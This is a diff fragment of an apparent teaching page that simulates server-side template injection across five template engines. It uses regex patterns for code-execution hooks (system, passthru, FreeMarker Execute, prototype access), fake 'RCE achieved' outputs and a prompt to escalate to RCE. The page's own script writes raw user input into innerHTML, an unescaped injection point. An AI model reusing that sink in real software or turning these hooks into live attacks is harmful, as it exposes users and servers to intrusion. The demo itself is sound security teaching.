+    if(/system|exec|passthru|_self/.test(s)) return {out:'Hello uid=33(www-data)',ssti:true,rce:true,note:'PHP system() called via Twig filter — RCE achieved'};
+    if(/\{\{.+\}\}/.test(s)) return {out:'Hello [Twig expression evaluated]',ssti:true,rce:false,note:'Twig evaluated this expression'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'No Twig syntax detected'};
+  }},
+  freemarker:{name:'FreeMarker',lang:'Java',fn:(s)=>{
+    if(/\$\{7\s*\*\s*7\}/.test(s)) return {out:'Hello 49',ssti:true,rce:false,note:'FreeMarker arithmetic — SSTI confirmed'};
+    if(/Execute|ObjectConstructor|freemarker\.template/.test(s)) return {out:'Hello uid=0(root) gid=0(root)',ssti:true,rce:true,note:'FreeMarker Execute class invoked — RCE as root!'};
+    if(/\$\{.+\}/.test(s)||/<#/.test(s)) return {out:'Hello [FreeMarker expression evaluated]',ssti:true,rce:false,note:'FreeMarker expression evaluated'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'No FreeMarker syntax'};
+  }},
+  handlebars:{name:'Handlebars',lang:'Node.js',fn:(s)=>{
+    if(/constructor|prototype|__proto__/.test(s)) return {out:'Hello uid=1000(app)',ssti:true,rce:true,note:'Prototype pollution bypass — constructor access leads to RCE in older Handlebars'};
+    if(/\{\{.+\}\}/.test(s)) return {out:'Hello '+s,ssti:false,rce:false,note:'Handlebars does NOT evaluate expressions — logic-less design. Returns literal.'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'Handlebars treats all input as literal data — much safer by design'};
+  }},
+  erb:{name:'ERB',lang:'Ruby',fn:(s)=>{
+    if(/<%=/.test(s)&&(/7\s*\*\s*7/.test(s)||/system|IO|File|`/.test(s))) return {out:'Hello uid=33(www-data)',ssti:true,rce:true,note:'ERB <%= %> tag evaluated — Ruby executed on server'};
+    if(/<%/.test(s)) return {out:'Hello [ERB block executed]',ssti:true,rce:false,note:'ERB tag evaluated'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'No ERB syntax detected'};
+  }},
+  smarty:{name:'Smarty',lang:'PHP',fn:(s)=>{
+    if(/\{math|\{\$/.test(s)) return {out:'Hello 49',ssti:true,rce:false,note:'Smarty expression evaluated'};
+    if(/\{php\}|passthru|system/.test(s)) return {out:'Hello uid=33(www-data)',ssti:true,rce:true,note:'Smarty PHP block — RCE achieved'};
+    if(/\{.+\}/.test(s)) return {out:'Hello [Smarty tag evaluated]',ssti:true,rce:false,note:'Smarty expression evaluated'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'No Smarty syntax'};
+  }}
+};
+
+function runDemo(){
+  const input=document.getElementById('ssti-input').value;
+  const key=document.getElementById('engine-select').value;
+  const eng=ENG[key];
+  const {out,ssti,rce,note}=eng.fn(input);
+  const vOut=document.getElementById('vuln-out');
+  const sOut=document.getElementById('safe-out');
+  const verd=document.getElementById('demo-verdict');
+
+  vOut.innerHTML=ssti
+    ? '<span style="color:'+(rce?'#f87171':'#fbbf24')+'">'+out+'</span>'
+    : out;
+
+  sOut.innerHTML='<span style="color:#4ade80">Hello '+input+'\n\n(passed as variable — never evaluated\nby the template engine)</span>';
+
+  if(rce){
+    verd.className='result-box r-red';
+    verd.innerHTML='<strong>Remote Code Execution!</strong> '+note+'. Engine: <strong style="font-weight:600">'+eng.name+' ('+eng.lang+')</strong>. The secure server returned the literal input — zero code execution.';
+  } else if(ssti){
+    verd.className='result-box r-amber';
+    verd.innerHTML='<strong>SSTI confirmed.</strong> '+note+'. Engine: <strong style="font-weight:600">'+eng.name+' ('+eng.lang+')</strong>. Now escalate to RCE using engine-specific payloads.';
+  } else {
+    verd.className='result-box r-green';
+    verd.innerHTML='<strong>No injection.</strong> '+note+' — '+eng.name+' did not evaluate this input as an expression.';
+  }
+}
+
+document.getElementById('ssti-input').addEventListener('input',runDemo);
+runDemo();
+</script>
+</body>
+</html>
